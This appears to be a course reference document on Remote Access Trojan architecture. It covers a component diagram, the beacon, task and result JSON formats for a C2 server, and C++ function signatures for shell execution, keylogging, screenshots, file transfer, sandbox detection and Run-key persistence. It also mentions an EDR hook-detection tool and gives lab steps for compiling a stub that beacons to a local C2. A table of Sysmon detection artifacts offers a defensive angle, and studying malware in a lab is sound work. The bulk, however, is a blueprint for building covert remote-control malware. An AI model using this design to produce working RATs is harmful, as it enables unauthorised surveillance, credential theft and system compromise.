# RAT Architecture — Technical Reference

## Component Map

```
┌─────────────────────────────────────────────────────────────┐
│                        RAT STUB                             │
│                                                             │
│  Config          Mutex          Sandbox         Persistence │
│  ────────        ─────          ───────         ─────────── │
│  Reads .rc or    CreateMutexA   CPU/uptime/     Run key     │
│  embedded        single-inst    screen/mouse    Startup dir │
│  struct          guard          CPUID check     Schtask     │
│       │               │               │              │      │
│       └───────────────┴───────────────┴──────────────┘      │
│                               │                             │
│                           Beacon loop                       │
│                    (HTTP/S GET /checkin every N sec)         │
│                               │                             │
│                           Dispatch                          │
│                    (task type → handler fn)                  │
│                               │                             │
│          ┌────────────────────┼────────────────────┐        │
│       shell_exec          screenshot           keylogger    │
│       file_upload         file_download        persistence  │
└─────────────────────────────────────────────────────────────┘
                               │  HTTPS
                     ┌─────────▼──────────┐
                     │   C2 SERVER        │
                     │  Node.js / Express │
                     │  POST /checkin     │
                     │  GET  /task        │
                     │  POST /result      │
                     └────────────────────┘
```

---

## Beacon JSON Format

Sent as HTTP POST body to `/checkin`:

```json
{
  "id":       "a3f9bc12",
  "hostname": "DESKTOP-ABC123",
  "user":     "DESKTOP-ABC123\\Alice",
  "os":       "Windows 11 Pro 22H2",
  "pid":      4812,
  "arch":     "x64"
}
```

---

## Task JSON Format (C2 → Agent)

Returned by `GET /task`:

```json
{
  "task_id": "t001",
  "type":    "shell",
  "args":    { "cmd": "whoami" }
}
```

Task types: `shell` | `upload` | `download` | `screenshot` | `persist` | `kill`

---

## Result JSON Format (Agent → C2)

Sent as HTTP POST to `/result`:

```json
{
  "task_id":  "t001",
  "agent_id": "a3f9bc12",
  "output":   "DESKTOP-ABC123\\Alice",
  "error":    null,
  "ts":       1700000000
}
```

---

## Per-Component Function Signatures

```cpp
// Config
struct Config {
    char  c2_host[128];
    DWORD c2_port;
    DWORD beacon_interval_ms;
    char  mutex_name[64];
    BOOL  sandbox_abort;
    BOOL  persist_on_start;
};
bool  config_load(Config* out);

// Mutex
bool  mutex_check(const char* name);  // returns false if already running

// Sandbox
bool  sandbox_detected();  // true = abort

// Persistence
bool  persist_run_key(const char* value_name, const char* exe_path);
bool  persist_startup(const char* exe_path);

// Beacon
typedef void (*task_callback)(const char* task_json);
void  beacon_loop(const Config* cfg, task_callback on_task);

// Dispatch
void  dispatch(const char* task_json, char* result_buf, size_t result_sz);

// Handlers
void  handler_shell(const char* cmd, char* out, size_t sz);
void  handler_screenshot(const char* outfile);
void  handler_upload(const char* local_path, const char* c2_endpoint);
void  handler_download(const char* url, const char* local_path);
void  handler_keylogger(bool enable);
void  handler_kill();
```

---

## Detection Artifacts per Component

| Component   | Detection method            | Sysmon ID / artifact                   |
|-------------|-----------------------------|----------------------------------------|
| Mutex       | CreateMutexA with fixed name| Sysmon 17 (named pipe) / manual audit  |
| Sandbox     | CPUID leaf 1 bit 31         | CPUID trace (ring-0 / hypervisor only) |
| Persistence | RegSetValueEx Run key       | Sysmon 13 (RegistryEvent SetValue)     |
| Beacon      | WinINet HTTP GET loop       | Sysmon 3 (NetworkConnect); Wireshark   |
| shell_exec  | cmd.exe child of agent      | Sysmon 1 (ProcessCreate) parent match  |
| Screenshot  | BitBlt + GetDC              | Unusual DC usage (ETW)                 |
| Keylogger   | SetWindowsHookEx WH_KEYBOARD| Sysmon 17; process open handle list    |

### Relevant Registry Keys

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\<value_name>
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\<value_name>
```

### Hook Signatures (ntdll.dll .text)

Hooked function bytes start with `E9` (relative JMP) when an EDR patches them.
Use `edr_bypass.exe detect-hooks` to enumerate.

---

## Lab Setup (Module 20 C2 Server)

```
1. cd docs/20-custom-c2
2. npm install express
3. node ex01_c2_server_routes.js        # starts on :3000
4. Open docs/20-custom-c2/c2_dashboard.html in browser
5. Compile your stub (see docs/09-rat-architecture/ex07_full_stub.cpp)
6. Run the stub — it beacons to localhost:3000
7. Issue commands from the dashboard
```

Configure the beacon interval and C2 host in the stub's `Config` struct
before compiling, or embed via the Builder (see root README).
